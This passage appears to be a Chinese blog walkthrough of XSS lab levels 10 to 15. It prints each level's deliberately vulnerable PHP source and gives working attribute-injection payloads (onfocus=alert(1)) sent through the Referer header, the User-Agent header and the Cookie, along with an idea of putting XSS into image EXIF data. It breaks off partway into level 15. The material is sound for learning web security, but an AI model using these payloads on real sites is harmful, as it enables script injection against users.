class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:0<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>此时的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>新的type&#x3D;”text”就覆盖了原来的type，就能让输入框显示出来了  </p>
<p>隐藏的input标签可以插入type&#x3D;”text”显示 </p>
<p>ai的解释：</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elm">即使最终 <span class="hljs-type">DOM</span> 中有两个 <span class="hljs-keyword">type</span>，但只要浏览器曾经把它当作 text 处理，它就可能：<br><br>在页面上占据空间<br>可以获得焦点<br>可以触发 onfocus<br>而 onfocus 事件不依赖 <span class="hljs-keyword">type</span> 最终值，只要元素能获得焦点即可。<br></code></pre></td></tr></table></figure>

<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>先看一下源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level12.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level11&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>看到$str和$str00都会被转义，但http报头会被引用？<br>那注入点就是在报头了，和ai沟通一波，<br>最后再把上一题的payload拿来用，在http报头加上payload:  </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Referer</span>: &#x27;<span class="hljs-string">&quot; onfocus=&quot;</span>alert(<span class="hljs-number">1</span>)<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; &quot;</span><br></code></pre></td></tr></table></figure>

<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>依旧先偷看一眼源码：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level13.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level12&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html<br></code></pre></td></tr></table></figure>
<p>依旧报头注入，这次变成USER_AGENT了<br>也是直接拿上题payload来用：  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/level12.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&#x27;&quot; onfocus=&quot;alert(1)&quot; type=&quot;text&quot; &quot;<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br></code></pre></td></tr></table></figure>

<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>进页面先有个php语法报错：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level14.php&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level13&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;<br>&lt;br /&gt;<br>&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent <span class="hljs-title function_ invoke__">by</span> (output started at /<span class="hljs-keyword">var</span>/www/html/level13.<span class="hljs-attr">php</span>:<span class="hljs-number">1</span>) in &lt;b&gt;/<span class="hljs-keyword">var</span>/www/html/level13.php&lt;/b&gt; on line &lt;b&gt;<span class="hljs-number">16</span>&lt;/b&gt;&lt;br /&gt;<br>&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;<br>&lt;form id=search&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_link&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_history&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_sort&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_cook&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payload的长度:<span class="hljs-number">0</span>&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br>```  <br>  <br>看样子是无法解析报头  <br><br>开源码看看：<br><br>```php<br>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level14.php&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level13&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>e，是cookie吗<br>那在cookie注入即可：  </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /level13.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua: <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;129&quot;</span>, <span class="hljs-string">&quot;Not=A?Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span><br><span class="hljs-attribute">sec</span>-ch-ua-mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">Cookie</span>: user=&#x27;%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>onfocus%<span class="hljs-number">3</span>d%<span class="hljs-number">22</span>alert(<span class="hljs-number">1</span>)%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>type%<span class="hljs-number">3</span>d%<span class="hljs-number">22</span>text%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>%<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>

<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>这关加载了一个奇怪的图片？  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;title&gt;欢迎来到level14&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;<br>&lt;center&gt;&lt;iframe name=<span class="hljs-string">&quot;leftframe&quot;</span> marginwidth=<span class="hljs-number">10</span> marginheight=<span class="hljs-number">10</span> src=<span class="hljs-string">&quot;http://www.exifviewer.org/&quot;</span> frameborder=no width=<span class="hljs-string">&quot;80%&quot;</span> scrolling=<span class="hljs-string">&quot;no&quot;</span> height=<span class="hljs-number">80</span>%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xss/level15.php?src=<span class="hljs-number">1</span>.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>看看源码吧：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;title&gt;欢迎来到level14&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;<br>&lt;center&gt;&lt;iframe name=<span class="hljs-string">&quot;leftframe&quot;</span> marginwidth=<span class="hljs-number">10</span> marginheight=<span class="hljs-number">10</span> src=<span class="hljs-string">&quot;http://www.exifviewer.org/&quot;</span> frameborder=no width=<span class="hljs-string">&quot;80%&quot;</span> scrolling=<span class="hljs-string">&quot;no&quot;</span> height=<span class="hljs-number">80</span>%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xss/level15.php?src=<span class="hljs-number">1</span>.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>???<br>查了一下，网站是一个exif查看器用来查看图片信息的  </p>
<p>那思考一下，竟然都是在我的前端上解析的，那我改host是不是能指向我想指向的ip？  </p>
<p>和ai探讨了一下，在比赛中一般是有bot来当做用户来访问触发我的xss，而我是不能修改他们的host的  </p>
<p>所以另一个方向是上传一张会返回xss的图片？  </p>
<p>问题是在我的环境上无法打开网站，提示：  </p>
<p>Please turn off your ad blocker.</p>
<p>要我关掉我的广告拦截器？  </p>
<p>关了edge的一个相关功能，还是打不开。  </p>
<p>上网找wp吧。参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/282983.html">文章</a>  </p>
<p>网站会解析图片的exif信息，然后返回到前端，在图片的exif里插入xss即可完成攻击  </p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>查看源码：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html ng-app&gt;<br>&lt;head&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>        &lt;script src=<span class="hljs-string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span 